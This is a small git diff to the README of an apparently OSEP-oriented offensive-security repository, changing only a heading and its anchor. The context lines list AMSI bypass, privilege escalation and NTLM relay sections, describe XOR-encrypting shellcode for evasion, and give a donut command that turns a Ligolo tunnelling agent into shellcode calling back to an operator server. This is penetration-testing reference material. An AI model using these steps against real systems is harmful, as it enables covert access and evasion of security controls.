@@ -4,7 +4,7 @@
 > Some of the tools and scripts in here weren’t made by me - huge thanks to everyone whose code contributed to this repository!<br>
 > Payloads consisting shellcode will not work with the XOR encryption of msfvenom. Instead, encrypt the shellcode by using the one provided [here](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/XOR%20Shellcode%20Encoder/Program.cs) or the GUI version available [here](https://github.com/Extravenger/OSEPlayground/tree/main/13%20-%20XOR-Encoder).
 
-- [1. Tunneling (Ligolo-NG)](#Tunneling-(Ligolo-NG))
+- [1. Tunneling (Ligolo-NG)](#Tunneling---Ligolo-NG)
 - [2. Map The Network](#Map-The-Network)
 - [3. AMSI-Bypass](#AMSI-Bypass)
 - [4. Windows Privilege Escalation](#Windows-Privilege-Escalation)
@@ -18,7 +18,7 @@
 - [12. NTLM Relay](#NTLM-Relay)
 
 
-# Tunneling (Ligolo-NG)
+# Tunneling - Ligolo-NG
 
 Make sure to convert agent.exe of ligolo to shellcode: 
 - `donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe` 
